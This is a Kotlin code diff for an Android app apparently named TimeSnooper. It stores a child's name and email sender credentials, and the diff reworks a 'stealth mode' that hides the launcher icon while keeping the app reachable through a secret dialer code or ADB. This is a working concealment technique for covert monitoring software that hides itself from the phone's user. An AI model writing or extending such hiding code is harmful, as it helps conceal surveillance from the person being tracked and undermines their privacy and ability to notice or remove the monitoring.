@@ -39,6 +39,7 @@ class MainActivity : AppCompatActivity() {
         const val KEY_CHILD_NAME = "child_name"
         const val KEY_SENDER_EMAIL = "sender_email"
         const val KEY_SENDER_APP_PASSWORD = "sender_app_password"
+        const val LAUNCHER_ALIAS_CLASS = "com.timesnooper.app.ui.LauncherAlias"
     }
 
     private lateinit var prefs: SharedPreferences
@@ -312,23 +313,51 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun enableStealthMode() {
-        val componentName = ComponentName(this, MainActivity::class.java)
-        packageManager.setComponentEnabledSetting(
-            componentName,
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP
-        )
-        Toast.makeText(this, "런처 아이콘이 숨겨졌습니다. 백그라운드에서 상시 작동합니다.", Toast.LENGTH_SHORT).show()
-        finish()
+        try {
+            // 1. 런처 별칭(LauncherAlias)만 비활성화하여 런처(홈/앱 서랍)에서 아이콘 완전 제거
+            val aliasComponent = ComponentName(this, LAUNCHER_ALIAS_CLASS)
+            packageManager.setComponentEnabledSetting(
+                aliasComponent,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+
+            // 2. MainActivity 자체는 활성화 상태 유지 (시크릿 다이얼 *#*#8463#*#* 이나 브로드캐스트로 언제든 정상 호출 가능)
+            val mainComponent = ComponentName(this, MainActivity::class.java)
+            packageManager.setComponentEnabledSetting(
+                mainComponent,
+                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                PackageManager.DONT_KILL_APP
+            )
+
+            Toast.makeText(
+                this,
+                "스텔스 모드 가동: 런처 아이콘이 숨겨집니다.\n다시 열기: 다이얼 *#*#8463#*#* 또는 ADB",
+                Toast.LENGTH_LONG
+            ).show()
+            finish()
+        } catch (e: Exception) {
+            Toast.makeText(this, "스텔스 설정 오류: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
     }
 
     private fun disableStealthMode() {
-        val componentName = ComponentName(this, MainActivity::class.java)
-        packageManager.setComponentEnabledSetting(
-            componentName,
-            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-            PackageManager.DONT_KILL_APP
-        )
-        Toast.makeText(this, "런처 아이콘이 홈 화면에 다시 복구되었습니다.", Toast.LENGTH_SHORT).show()
+        try {
+            val aliasComponent = ComponentName(this, LAUNCHER_ALIAS_CLASS)
+            packageManager.setComponentEnabledSetting(
+                aliasComponent,
+                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                PackageManager.DONT_KILL_APP
+            )
+            val mainComponent = ComponentName(this, MainActivity::class.java)
+            packageManager.setComponentEnabledSetting(
+                mainComponent,
+                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                PackageManager.DONT_KILL_APP
+            )
+            Toast.makeText(this, "런처 아이콘이 홈 화면에 다시 복구되었습니다.", Toast.LENGTH_SHORT).show()
+        } catch (e: Exception) {
+            Toast.makeText(this, "복구 오류: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
     }
 }
